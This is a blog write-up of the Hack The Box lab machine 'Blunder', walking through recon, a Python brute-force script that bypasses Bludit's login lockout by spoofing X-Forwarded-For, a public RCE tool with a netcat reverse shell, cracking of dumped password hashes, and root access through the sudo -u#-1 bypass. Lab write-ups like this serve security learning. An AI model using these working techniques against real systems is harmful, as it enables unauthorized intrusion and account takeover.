---
title: Hack the Box Blunder Writeup
tags: 
- hackthebox
- writeup
image: /images/blunder/info.png
---

Another day another machine rooted... This one had quite a frustrating foothold process, wouldn't recommend for a deteriorating mental health. Surprisingly the root was as easy as it gets (if you have done 3-4 machines before). This machine was all about those CVEs and rabbit holes. There are total of 3 CVEs that needed to be exploited and don't know how many rabbit holes to get all the way to root. Let's get started! 

<!--more-->

<img src="/images/blunder/info.png" />

Like always, starting with basic nmap scan with nothing but default configurations.

```
nmap -T4 10.10.10.191

Starting Nmap 7.60 ( https://nmap.org ) at 2020-08-21 21:38 IST
Nmap scan report for 10.10.10.191
Host is up (0.37s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE
21/tcp closed ftp
80/tcp open   http

Nmap done: 1 IP address (1 host up) scanned in 26.70 seconds

```

So we see there is a web server on port 80. Browsing to the web-page.

<img src="/images/blunder/website.png" width="1000"/>

Hmm... it's a blog website and I'm just gonna go ahead and call bullshit on the statement- "I created this site to dump my fact files, nothing more...?". So I start reading the blogs and don't really notice anything. Then I fire up Dirbuster with a list I commonly use. (No really the name of the list literally is common.txt... You can find it on the seclists github repository)  And oh boy! did I find a treasure trove or what? I never had so much stuff found when using dirbuster.

<img src="/images/blunder/dirbuster.png" width="1000"/>

So I start visiting each and every thing dirbuster found. Most of them were useless except /admin and /todo.txt . Also when I was visiting all the pages I found the name of CMS system the website was using, It was Bludit and I found the version number by looking at the html of the main page of the site, It was 3.9.2
All this information is really necessary when we are dealing with CVEs to pinpoint the vulnerabilities for that particular software and version. I started digging about the CVEs for this software and voilla!

<img src="/images/blunder/cves.png" width="1000"/>

It had a bruteforce login bypass and a remote code execution too! But the remote code execution part required me to find the credentials first. Browsing to /admin and /todo.txt .

<img src="/images/blunder/adminlogin.png" />

I tried sql injection and default login credentials for bludit but that didn't work. Then came to the conclusion that I will probably have to find the credentials.

<img src="/images/blunder/todo.png" />

This gives us the name of a possible user "fergus".

Here is the part I got stuck because I had no leads or ideas about where to go from here. Heading over to Hackthebox forums (this has become a ritual for all my writeups) I see someone saying that everything I need is in front of me and It maybe written a bit different from others. I go back to the blog and start making a list of possible passwords **manually**. Later I found that there is a tool for cool people known as cewl, it is used to make a wordlist from automatically -_- . Anyway here is the list I made:

```
fergus
blunder
Blunder
admin
stephen king
stephen edwin king
king
richard bachman
rolanddeschain
RolandDeschain
oeuvre
king of horror
King of Horror
stadia
Stadia
usb
USB
1996
universal serial bus
Uinversal Serial Bus
yoo-es-bee

```

Moving on... I make python script to try all the passwords for the user "fergus" Soon to find out that my requests were getting blocked. WAHT?! I remember the CVEs I found had something to bypass this behaviour. I look at [CVE-2019-17240](https://www.cvedetails.com/cve/CVE-2019-17240/), which tells me that if I change the header X-Forwarded-For header the CMS will not be able to pin point the source of bruteforce to my IP and thus we will be able to bypass the mechanism. Here is the final script:

```
import requests
import re
f=open('list.txt','r')
password=f.read().split('\n')
f.close()

for p in password:
	s=requests.Session()
	page=s.get('http://10.10.10.191/admin/')
	token=re.findall('name="tokenCSRF" value=".*"',page.text)
	payload={'username':'fergus','password':p,'tokenCSRF':token[0][24:-1]}
	x=s.post('http://10.10.10.191/admin/',data=payload,headers={'X-Forwarded-For':p})
	if 'Login' not in x.text:
		print(p)

```

Also I would like to add that I **suck** at regex patterns and used some dirty logic instead. Please don't judge me.
Moving on this gave me the password for user fergus and it was time for some Remote Code Executions! I search for CVE-2019-16113 and found a [github repo](https://github.com/cybervaca/CVE-2019-16113) which had tool for it.

From what I could understand from the given python script is first we upload a .png file with the payload written in php to connect back to us with a shell. Then we change the mime type of the file from .png to an application/php type and then when we browse to it the file is executeed and we get a reverse shell. NEAT!
Though I somewhat understand what is being done there is no way I would be able to write something like that right now with my current level of knowledge.

I just use the tool for now and give it the needed details and setup a netcat listener with `nc lvp 1337`

<img src="/images/blunder/command.png" width="1000"/>

Aaand... we got a shell. using `whoami` we are the user www-data. Then I just start looking around in all the files cd in... cd out... and I stumble across a users.php in database folder with the contents

```
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "6c1e22283d639ad45fbb8ea95e8cd039",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
```

Well then I headed toward online hash cracking service like crackstation.net but that didn't really work out for either of the hashes I found in the users.php file. Well what can you do except enumerate more... so I began looking for juicy stuff again and saw an unusual directory name ftp in the root directory. I open it up and see a note.txt, inside there was some text like

`Hey Sophie`
`I've left the thing you're looking for in here for you to continue my work`
`when I leave. The other thing is the same although Ive left it elsewhere too.`
``
`Its using the method we talked about; dont leave it on a post-it note this time!`

`Thanks`
`Shaun` 

So I guess there is more stuff I could find in this directory(**wrong!**). I start looking inside home directories of 2 users shaun and hugo. I open each and every directory until I found something in the Pictures directory of shaun. There were 2 images, so I copy them to the web server folder and browse to them. I see:

<img src="/images/blunder/Screenshot from 2019-11-28 13-17-29.png" width="1000"/>

<img src="/images/blunder/Screenshot from 2019-11-28 14-02-13.png" width="1000" />

AndI am like holy crap I accidently found the root hash! Awesome! I have never seen that someone found the root flag before user flag. So I copy the flag and try it and guess what? It was a god damn rabbit hole.

<img src="https://media.giphy.com/media/11tTNkNy1SdXGg/giphy.gif" />

Well whatever.. I start again from the directory where I first landed and this time I found directory of bludit but a different version. So I start looking there too and found a users.php in the database folder and I found something similar to before

```
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

But this time it is an unsalted password hash I go out to [crackstation](crackstation.net) again and this time we are able to crack it! It gives us the password "Password120" for hugo. So I do `su hugo` and enter password and yep we are now user hugo and we can get the user flag. Now It is time to finally escalate things to root. I try one the first things that should be done while escalating privileges i.e. `sudo -l` and I get error

`sudo: no tty present and no askpass program specified`

Ok... Then I googled what the heck even a tty is. I stumbled accross [an awesome article](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) 

So from my understanding a non-tty shell is a "dumb" shell which lacks many features are a sometimes necessary/nice to have. Following the article I was able to spwan a tty shell and then I used `sudo -l` and put in the password and I am greeted with something like this

```

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash

```

Then I had to google again to to find what the message meant. The message means that I am able to run /bin/bash as any user in the machine except the root user. What a downer! Funny thing is when I was searching about what the message meant I also discovered a vulnerability for when a situation like this occurs. According to [this page at exploit-db](https://www.exploit-db.com/exploits/47502) I can make use of this CVE and spawn a shell with root privileges. The command I had to use is `sudo -u#-1 /bin/bash`. This command works because sudo only check if the supplied user is root or not but the #-1 returns 0 which is yes thats right the user id of root account! And just like that we have escalated our privileges to root.

Once again I learned a lot from this machine too and maybe I will try medium level machines sometime in near future. Till then Connect with me on linkedin for updates on the releases. See ya!